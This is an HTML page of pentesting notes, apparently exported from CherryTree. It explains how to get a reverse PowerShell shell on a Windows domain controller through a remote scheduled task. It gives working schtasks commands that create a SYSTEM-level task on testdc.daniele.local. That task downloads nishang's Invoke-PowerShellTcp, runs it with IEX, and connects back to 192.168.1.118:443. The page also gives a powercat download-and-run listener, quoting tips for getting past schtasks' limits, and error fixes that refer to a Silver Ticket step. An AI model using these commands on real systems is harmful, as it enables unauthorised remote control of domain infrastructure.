<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Schedule Reverse Powershell(option 1)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Schedule Reverse Powershell(option 1)</h1><br />Github InvokePowershellTcp.ps1: <a
      href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br />Github
    powercat.ps1: <a
      href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1" target="_blank">https://github.com/besimorhino/powercat/blob/master/powercat.ps1</a><br />schtasks
    single and double quotes problem: <a
      href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command" target="_blank">https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command</a><br /><br />2.
    Schedule and execute a task <br /> Remember that the value of /TR cannot be more than 261 characters. <br />
    schtasks does not allow use single quotes because of that we had to use a lot of backslash(\), and backtick(`).
    <br /> This is been explained on this <a
      href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command" target="_blank">post of stackoverflow</a>.
    We can summarize it by saying that when we use <span style="text-decoration:underline;">schtasks</span> we have to
    use:<br /> ▪ Quotes “ → ” <br /> ▪ SubQuotes → \`&quot; <br /> ▪ SubSubQuotes → \\\`&quot;<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;schtasks&nbsp;/create&nbsp;/S&nbsp;testdc.daniele.local&nbsp;/SC&nbsp;Weekly&nbsp;/RU&nbsp;&quot;NT&nbsp;Authority\SYSTEM&quot;&nbsp;/TN&nbsp;&quot;STCheck&quot;&nbsp;/TR&nbsp;&quot;powershell.exe&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;\`&quot;IEX(New-Object&nbsp;Net.WebClient).DownloadString(\\\`&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\\\`&quot;);\`&quot;Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IpAddress&nbsp;192.168.1.118&nbsp;-Port&nbsp;443&quot;
      </div>
    </div><br /> ◇ If we give us: &quot;<span style="color:#ff0000;">ERROR:Access Denied</span>&quot; maybe we have to
    remake the SilverTicket(Point 1)<br /> ◇ If we give use: “<span style="color:#ff0000;">ERROR: No mapping between
      account names and security IDs was done</span>” maybe the username for /RU [username] does not exist.<br /> try
    “Administrator” or &quot;NT Authority\SYSTEM&quot; <br /> <a href=""><img src="images/1151-1.png"
        alt="images/1151-1.png" /></a><br /> If we have access to the Windows Server, we can go to:<br /> <em>Server
      Manager → Tools → Task Manager → Task Schedule Library → right click on our task → Proprieties →
      Actions</em><br /> we can see that the command will be reinterpreted and executed like that by the Windows Server:
    <a href=""><img src="images/1151-2.png" alt="images/1151-2.png" /></a><br />3. We can check if the task is been
    created by querying the server:<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;schtasks&nbsp;/query&nbsp;/S&nbsp;testdc.daniele.local</div>
    </div><br /> <a href=""><img src="images/1151-3.png" alt="images/1151-3.png" /></a><br />4. Now we have to create a
    channel listening on our machine on the Port specified(in our case 443)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;)<br />PS&gt;&nbsp;powercat&nbsp;-l&nbsp;-v&nbsp;-p&nbsp;443&nbsp;-t&nbsp;1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#listening&nbsp;on&nbsp;port&nbsp;443
      </div>
    </div><br /> <a href=""><img src="images/1151-4.png" alt="images/1151-4.png" /></a><br />5. Now we can run the
    scheduled task “STCheck” created before<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;schtasks&nbsp;/Run&nbsp;/S&nbsp;testdc.daniele.local&nbsp;/TN&nbsp;&quot;STCheck&quot;</div>
    </div><br /> <a href=""><img src="images/1151-5.png" alt="images/1151-5.png" /></a><br />6. If we come back to the
    shell where we have powercat listening, we should have the shell of the Domain Controller<br /> <a href=""><img
        src="images/1151-6.png" alt="images/1151-6.png" /></a><br /><br />
  </div>
</body>

</html>